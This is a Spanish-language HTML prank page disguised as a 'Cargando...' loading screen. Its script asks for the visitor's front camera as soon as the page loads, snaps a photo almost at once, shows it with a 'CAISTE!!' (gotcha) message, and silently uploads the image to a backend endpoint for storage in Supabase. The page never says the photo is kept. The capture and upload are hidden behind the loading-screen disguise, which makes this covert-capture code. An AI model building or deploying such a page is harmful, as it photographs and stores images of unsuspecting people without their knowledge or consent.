<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #000; /* Fondo inicial mientras carga */
        }

        /* Oculta los elementos de captura */
        #video, #canvas {
            display: none; 
        }

        /* Pantalla de sorpresa */
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            
            /* El gradiente solicitado */
            background: linear-gradient(180deg, #000000 0%, #8b0000 100%); /* De negro a rojo */
            
            opacity: 0;
            transition: opacity 0.5s ease-in;
            z-index: 10;
        }

        #overlay.visible {
            opacity: 1;
        }

        #overlay.hidden {
            display: none; /* Oculta completamente para no interferir */
        }

        /* La foto capturada se muestra en pantalla completa */
        #foto-capturada {
            width: 100%;
            height: 100%;
            object-fit: cover; /* Mantiene la proporci√≥n y llena el espacio */
            position: absolute;
            top: 0;
            left: 0;
            z-index: 11;
        }

        /* Mensaje encima de la foto */
        #overlay h1 {
            font-family: Arial, sans-serif;
            font-size: 5vw;
            color: white;
            text-shadow: 2px 2px 4px #000;
            position: relative;
            z-index: 12;
        }
    </style>
</head>
<body>
    <video id="video" playsinline autoplay muted></video>
    <canvas id="canvas"></canvas>

    <div id="overlay" class="hidden">
        <img id="foto-capturada" src="" alt="Tu foto">
        <h1>CAISTE!!ü§£</h1>
    </div>

    <script>
        // --- CONFIGURACI√ìN ---
        // ¬°¬°CAMBIO IMPORTANTE!!
        // Esta es una ruta relativa porque el frontend y el backend
        // ahora se sirven desde el mismo dominio de Vercel.
        const VERCEL_ENDPOINT_URL = "/api/guardar-imagen";
        // ---------------------

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const overlay = document.getElementById('overlay');
        const fotoCapturada = document.getElementById('foto-capturada');

        // 1. Solicitar acceso a la c√°mara inmediatamente
        async function iniciarCamara() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' } // Prioriza la c√°mara frontal
                });
                
                video.srcObject = stream;
                
                // Espera a que el video empiece a reproducirse
                video.onloadedmetadata = () => {
                    // Ajusta el tama√±o del canvas al del video
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    // ¬°Captura la foto casi instant√°neamente!
                    setTimeout(capturarFoto, 100); 
                };

            } catch (err) {
                console.error("Error al acceder a la c√°mara:", err);
                overlay.innerHTML = "<h1>Error de c√°mara üò¢</h1>";
                overlay.classList.remove('hidden');
                overlay.classList.add('visible');
            }
        }

        // 2. Funci√≥n para tomar la foto
        function capturarFoto() {
            const context = canvas.getContext('2d');
            
            // Dibuja el frame actual del video en el canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Obtiene la imagen como Data URL (Base64)
            const dataUrl = canvas.toDataURL('image/jpeg', 0.9); // Calidad 0.9

            // Muestra la foto en la pantalla de "ca√≠ste"
            fotoCapturada.src = dataUrl;
            mostrarPantallaBroma();

            // Detiene el stream de la c√°mara para apagar la luz de la webcam
            video.srcObject.getTracks().forEach(track => track.stop());

            // 3. Prepara y env√≠a los datos al backend (Vercel)
            const base64Data = dataUrl.split(',')[1];
            
            enviarAFirebase(base64Data);
        }

        // 4. Muestra la pantalla de broma
        function mostrarPantallaBroma() {
            overlay.classList.remove('hidden');
            void overlay.offsetWidth; 
            overlay.classList.add('visible');
        }

        // 5. Env√≠a el Base64 al backend seguro en Vercel
        async function enviarAFirebase(base64) {
            console.log("Enviando foto a Vercel...");
            try {
                const response = await fetch(VERCEL_ENDPOINT_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ base64: base64 }),
                });

                const result = await response.json();

                if (response.ok) {
                    console.log("¬°Foto guardada en Supabase con √©xito!", result);
                } else {
                    console.error("Error al guardar en Vercel/Supabase:", result.error);
                }

            } catch (err) {
                console.error("Error de red al enviar la foto:", err);
            }
        }

        // Inicia todo el proceso al cargar la p√°gina
        iniciarCamara();
    </script>
</body>
</html>
